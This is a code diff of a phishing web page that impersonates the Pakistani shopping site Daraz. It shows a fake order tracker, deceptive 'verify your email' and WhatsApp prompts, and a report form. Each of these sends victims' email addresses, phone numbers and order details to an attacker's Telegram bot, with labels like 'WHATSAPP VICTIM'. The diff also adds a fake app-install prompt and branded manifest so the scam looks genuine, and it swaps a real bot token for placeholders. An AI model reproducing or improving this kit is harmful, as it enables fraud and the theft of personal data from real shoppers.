+            <img src="https://img.icons8.com/ios-filled/50/666666/help.png" alt="Help">
+            <div>Help</div>
+        </a>
+        <a href="#" class="nav-item">
+            <img src="https://img.icons8.com/ios-filled/50/666666/shopping-cart.png" alt="Cart">
+            <div>Cart</div>
+        </a>
+        <a href="#" class="nav-item">
+            <img src="https://img.icons8.com/ios-filled/50/666666/user.png" alt="Account">
+            <div>Account</div>
+        </a>
+    </div>
+
+    <!-- PWA Manifest -->
     <script>
         // Telegram Bot Configuration (REPLACE THESE)
-        const TELEGRAM_BOT_TOKEN = "8612019166:AAG_D9Uw1Oz7-CdCM6vg3RQpi7MhUmtBDAc";
-        const TELEGRAM_CHAT_ID = "5748964940";
+        const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+
+        // PWA Installation
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.getElementById('installPrompt').style.display = 'flex';
+        });
+
+        function installApp() {
+            document.getElementById('installPrompt').style.display = 'none';
+            deferredPrompt.prompt();
+            deferredPrompt.userChoice.then((choiceResult) => {
+                if (choiceResult.outcome === 'accepted') {
+                    console.log('User accepted the install prompt');
+                }
+                deferredPrompt = null;
+            });
+        }
 
         // Track Order Function
         function trackOrder() {
@@ -648,11 +589,11 @@
                 return;
             }
 
-            // Show fake order status page
+            // Show order status page
             document.getElementById("trackingPage").style.display = "none";
             document.getElementById("orderStatusPage").style.display = "block";
 
-            // Fill dynamic data
+            // Generate fake data
             const orderDate = new Date().toLocaleDateString('en-GB', {
                 day: '2-digit', month: 'short', year: 'numeric'
             });
@@ -674,7 +615,6 @@
             // Update UI
             document.getElementById("orderNumberTitle").textContent = `Order #${orderNumber}`;
             document.getElementById("orderNumberValue").textContent = orderNumber;
-            document.getElementById("orderDate").textContent = `Placed on ${orderDate}`;
             document.getElementById("orderDateValue").textContent = orderDate;
             document.getElementById("estimatedDate").textContent = estimatedDelivery;
             document.getElementById("deliveryAddress").textContent = randomAddress;
@@ -682,6 +622,18 @@
             // Send to Telegram
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
                 encodeURIComponent(`🚨 NEW ORDER TRACKED 🚨\n\nOrder: ${orderNumber}\nDate: ${orderDate}\nAddress: ${randomAddress}`));
+        }
+
+        // Contact Support Function
+        function contactSupport() {
+            const email = prompt("⚠️ IMPORTANT: To change your delivery address, please verify your email:\n\nEnter your email address:");
+            if (email) {
+                // Send to Telegram
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
+                    encodeURIComponent(`📧 EMAIL CAPTURED 📧\n\nEmail: ${email}`));
+
+                alert(`✅ Verification Email Sent!\n\nWe've sent a verification link to ${email}.\nPlease check your inbox (or spam folder).`);
+            }
         }
 
         // WhatsApp Chat Function
@@ -692,19 +644,7 @@
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
                     encodeURIComponent(`📱 WHATSAPP VICTIM 📱\n\nPhone: ${phone}`));
 
-                alert(`Thank you! Our agent will contact you shortly on ${phone} regarding your order.`);
-            }
-        }
-
-        // Contact Support Function (Fake Email Capture)
-        function contactSupport() {
-            const email = prompt("⚠️ IMPORTANT: Due to high delivery volume, we need to verify your identity.\n\nPlease enter your EMAIL ADDRESS to proceed with support:");
-            if (email) {
-                // Send to Telegram
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
-                    encodeURIComponent(`📧 EMAIL CAPTURED 📧\n\nEmail: ${email}`));
-
-                alert(`✅ Verification Email Sent!\n\nWe've sent a verification link to ${email}.\nPlease click the link to connect with Daraz Support.\n\nNote: If you don't see the email, check your spam folder.`);
+                alert(`Thank you! Our agent will contact you shortly on ${phone}.`);
             }
         }
 
@@ -719,10 +659,45 @@
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
                 encodeURIComponent(`📝 REPORT SUBMITTED 📝\n\nOrder: ${order}\nEmail: ${email}\nIssue: ${issue}`));
 
-            alert("Thank you! Your report has been submitted. Daraz Support will contact you shortly.");
+            alert("Thank you! Your report has been submitted. We'll contact you shortly.");
             document.getElementById('reportModal').style.display = 'none';
             e.target.reset();
         }
+
+        // Make it look like a real app
+        document.addEventListener('DOMContentLoaded', () => {
+            // Add to home screen prompt
+            setTimeout(() => {
+                if (!window.matchMedia('(display-mode: standalone)').matches) {
+                    document.getElementById('installPrompt').style.display = 'flex';
+                }
+            }, 3000);
+        });
+    </script>
+
+    <!-- PWA Manifest File (Create this separately) -->
+    <script>
+        // This would be in manifest.json
+        const manifest = {
+            "name": "Daraz.pk - Online Shopping",
+            "short_name": "Daraz",
+            "start_url": ".",
+            "display": "standalone",
+            "background_color": "#f85606",
+            "theme_color": "#f85606",
+            "icons": [
+                {
+                    "src": "https://i.ibb.co/JjKznzzH/logo.png",
+                    "sizes": "192x192",
+                    "type": "image/png"
+                },
+                {
+                    "src": "https://i.ibb.co/JjKznzzH/logo.png",
+                    "sizes": "512x512",
+                    "type": "image/png"
+                }
+            ]
+        };
     </script>
 </body>
 </html>
